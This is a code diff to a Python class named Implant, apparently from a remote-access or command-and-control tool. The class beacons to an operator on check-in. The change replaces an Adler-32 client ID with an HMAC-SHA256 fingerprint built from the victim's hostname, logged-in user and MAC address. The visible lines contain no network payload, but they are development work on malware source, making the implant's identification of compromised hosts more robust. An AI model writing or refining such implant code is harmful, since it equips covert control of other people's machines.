@@ -15,7 +15,6 @@ import platform
 import random
 import socket
 import time
-import zlib
 from pathlib import Path
 
 from . import protocol as proto
@@ -59,12 +58,15 @@ class Implant:
 
     def _get_client_id(self) -> str:
         """Derive unique client ID from key + machine identity."""
+        import hashlib
+        import hmac
         import uuid
         hostname = socket.gethostname()
         user = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
         mac = format(uuid.getnode(), '012x')
-        seed = f"{self.key}|{hostname}|{user}|{mac}"
-        return format(zlib.adler32(seed.encode()) & 0xFFFFFFFF, '08x')
+        seed = f"{hostname}|{user}|{mac}"
+        h = hmac.new(self.key.encode(), seed.encode(), hashlib.sha256)
+        return h.hexdigest()[:16]
 
     def _send_checkin(self):
         """Send a check-in beacon so the operator knows we connected."""
